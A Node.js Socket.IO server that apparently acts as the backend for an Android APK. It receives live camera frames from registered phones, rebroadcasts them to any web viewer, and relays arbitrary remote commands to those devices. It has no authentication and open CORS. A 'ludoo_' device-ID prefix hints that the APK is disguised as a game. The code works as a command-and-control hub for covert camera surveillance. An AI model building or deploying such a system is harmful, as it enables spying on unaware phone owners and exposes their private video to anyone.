const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// ============================================
// STORAGE
// ============================================
let connectedDevices = [];
let latestFrames = {};

// ============================================
// MIDDLEWARE
// ============================================
app.use(express.json());
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  next();
});

// ============================================
// 🔴 LIVE STREAM PAGE (SMOOTH - WebSocket based)
// ============================================
app.get('/live', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Live Stream</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                background: #000;
                font-family: Arial, sans-serif;
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
            }
            .container {
                width: 100%;
                max-width: 600px;
                margin: 0 auto;
                padding: 16px;
            }
            .stream-box {
                background: #0a0a0a;
                border-radius: 20px;
                overflow: hidden;
                box-shadow: 0 0 30px rgba(0,255,136,0.2);
            }
            .stream-image {
                width: 100%;
                height: auto;
                display: block;
            }
            .info {
                background: rgba(0,0,0,0.8);
                padding: 12px;
                text-align: center;
                color: #00ff88;
                font-size: 14px;
                font-family: monospace;
            }
            .status {
                display: inline-block;
                width: 10px;
                height: 10px;
                border-radius: 50%;
                background: #00ff88;
                animation: pulse 1.5s infinite;
                margin-right: 8px;
            }
            @keyframes pulse {
                0% { opacity: 1; transform: scale(1); }
                50% { opacity: 0.5; transform: scale(0.8); }
                100% { opacity: 1; transform: scale(1); }
            }
            .device-id {
                background: #1a1a1a;
                padding: 8px 12px;
                border-radius: 10px;
                margin-top: 12px;
                text-align: center;
                color: #888;
                font-size: 12px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="stream-box">
                <img id="stream" class="stream-image" src="">
                <div class="info">
                    <span class="status"></span>
                    <span id="statusText">CONNECTING...</span>
                </div>
            </div>
            <div class="device-id" id="deviceIdDisplay">Device ID: Loading...</div>
        </div>

        <script src="/socket.io/socket.io.js"></script>
        <script>
            const socket = io();
            let currentDeviceId = null;
            
            // Get device ID from URL parameter
            const urlParams = new URLSearchParams(window.location.search);
            currentDeviceId = urlParams.get('device_id');
            
            if(!currentDeviceId) {
                currentDeviceId = prompt('Enter Device ID:', 'ludoo_');
                if(!currentDeviceId) {
                    document.getElementById('statusText').innerHTML = '❌ NO DEVICE ID';
                }
            }
            
            if(currentDeviceId) {
                document.getElementById('deviceIdDisplay').innerHTML = '📱 Device ID: ' + currentDeviceId;
                document.getElementById('statusText').innerHTML = '🟢 WAITING FOR FRAMES...';
            }
            
            socket.on('connect', () => {
                console.log('WebSocket connected');
                if(currentDeviceId) {
                    socket.emit('select_device', currentDeviceId);
                    document.getElementById('statusText').innerHTML = '🟢 CONNECTED - WATCHING';
                }
            });
            
            // Receive live frames
            socket.on('frame_update', (data) => {
                if(data.device_id === currentDeviceId) {
                    document.getElementById('stream').src = data.frame;
                    document.getElementById('statusText').innerHTML = '🟢 LIVE STREAMING';
                }
            });
            
            socket.on('disconnect', () => {
                document.getElementById('statusText').innerHTML = '🔴 DISCONNECTED';
            });
        </script>
    </body>
    </html>
  `);
});

// ============================================
// 🔴 MJPEG ENDPOINT (Vercel ke liye - img tag)
// ============================================
app.get('/api/frame.jpg', (req, res) => {
  const deviceId = req.query.device_id;
  
  if (!deviceId) {
    return res.status(400).send('device_id missing');
  }
  
  const frame = latestFrames[deviceId];
  
  if (!frame || !frame.data) {
    return res.status(404).send('No frame available');
  }
  
  let base64Data = frame.data;
  if (base64Data.includes(',')) {
    base64Data = base64Data.split(',')[1];
  }
  
  const imgBuffer = Buffer.from(base64Data, 'base64');
  
  res.writeHead(200, {
    'Content-Type': 'image/jpeg',
    'Content-Length': imgBuffer.length,
    'Cache-Control': 'no-cache, no-store, must-revalidate'
  });
  res.end(imgBuffer);
});

// ============================================
// 🔴 DEVICES API
// ============================================
app.get('/api/devices', (req, res) => {
  const devicesList = connectedDevices.map(device => ({
    device_id: device.id,
    device_name: device.name,
    status: "online"
  }));
  
  res.json({
    success: true,
    total: connectedDevices.length,
    devices: devicesList
  });
});

// ============================================
// 🔴 COMMAND API
// ============================================
app.get('/api/command', (req, res) => {
  const command = req.query.cmd;
  const deviceId = req.query.device_id;
  
  if (!deviceId) {
    return res.json({ success: false, error: "No device selected" });
  }
  
  const targetDevice = connectedDevices.find(d => d.id === deviceId);
  
  if (targetDevice) {
    io.to(targetDevice.socket_id).emit('command', command);
    console.log(`🎮 Command '${command}' → ${targetDevice.name}`);
    res.json({ success: true, command: command });
  } else {
    res.json({ success: false, error: "Device not found" });
  }
});

// ============================================
// 🔴 QUALITY API
// ============================================
app.get('/api/quality', (req, res) => {
  const quality = req.query.quality;
  const deviceId = req.query.device_id;
  
  if (!deviceId || !quality) {
    return res.json({ success: false, error: "Missing device or quality" });
  }
  
  const targetDevice = connectedDevices.find(d => d.id === deviceId);
  
  if (targetDevice) {
    io.to(targetDevice.socket_id).emit('quality', quality);
    console.log(`🎥 Quality '${quality}' → ${targetDevice.name}`);
    res.json({ success: true, quality: quality });
  } else {
    res.json({ success: false, error: "Device not found" });
  }
});

// ============================================
// 🔴 HOME API
// ============================================
app.get('/', (req, res) => {
  res.json({
    message: "APK Camera Stream Backend is Running",
    version: "2.0",
    online_devices: connectedDevices.length,
    smooth_stream_url: "/live?device_id=YOUR_DEVICE_ID",
    mjpeg_endpoint: "/api/frame.jpg?device_id=xxx",
    endpoints: {
      devices: "/api/devices",
      frame: "/api/frame.jpg?device_id=xxx",
      command: "/api/command?cmd=xxx&device_id=xxx",
      quality: "/api/quality?quality=xxx&device_id=xxx",
      live_stream: "/live?device_id=YOUR_DEVICE_ID"
    }
  });
});

// ============================================
// 🔴 WEBSOCKET (APK CONNECTION + BROADCAST)
// ============================================
io.on('connection', (socket) => {
  console.log('✅ APK Connected:', socket.id);
  
  let currentDevice = null;
  
  // APK registers itself
  socket.on('register_device', (data) => {
    const deviceId = data.device_id || data.device || socket.id;
    const deviceName = data.device_name || data.model || "Android Phone";
    
    currentDevice = {
      id: deviceId,
      name: deviceName,
      socket_id: socket.id,
      connected_at: new Date().toISOString()
    };
    
    connectedDevices = connectedDevices.filter(d => d.id !== deviceId);
    connectedDevices.push(currentDevice);
    
    console.log(`\n📱 DEVICE ONLINE:`);
    console.log(`   Name: ${deviceName}`);
    console.log(`   ID: ${deviceId}`);
    console.log(`   Total devices: ${connectedDevices.length}\n`);
  });
  
  // 🔴 FRAME RECEIVE - STORE + BROADCAST TO /live PAGE
  socket.on('frame', (frameData) => {
    if (currentDevice) {
      // Store for MJPEG (Vercel)
      latestFrames[currentDevice.id] = {
        data: frameData,
        time: Date.now()
      };
      
      // 🔴 BROADCAST to all web clients watching (SMOOTH STREAM)
      io.emit('frame_update', {
        device_id: currentDevice.id,
        frame: frameData
      });
    }
  });
  
  // Web client selects a device to watch
  socket.on('select_device', (deviceId) => {
    socket.join(`device_${deviceId}`);
    console.log(`👁️ Web client watching device: ${deviceId}`);
  });
  
  socket.on('disconnect', () => {
    if (currentDevice) {
      console.log(`\n🔴 DEVICE OFFLINE:`);
      console.log(`   Name: ${currentDevice.name}`);
      console.log(`   ID: ${currentDevice.id}`);
      
      connectedDevices = connectedDevices.filter(d => d.id !== currentDevice.id);
      delete latestFrames[currentDevice.id];
      
      console.log(`   Total devices: ${connectedDevices.length}\n`);
    }
  });
});

// ============================================
// START SERVER
// ============================================
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`
  ═══════════════════════════════════════════════════════
  🚀 COMPLETE STREAMING SERVER STARTED
  ═══════════════════════════════════════════════════════
  
  📡 Port: ${PORT}
  
  🔴 SMOOTH STREAM (WebSocket - for /live page):
     → https://your-project.repl.co/live?device_id=YOUR_DEVICE_ID
  
  🔴 MJPEG STREAM (for Vercel img tag):
     → https://your-project.repl.co/api/frame.jpg?device_id=xxx
  
  🔴 APIs:
     → GET /api/devices
     → GET /api/command?cmd=xxx&device_id=xxx
     → GET /api/quality?quality=xxx&device_id=xxx
  
  ═══════════════════════════════════════════════════════
  `);
});
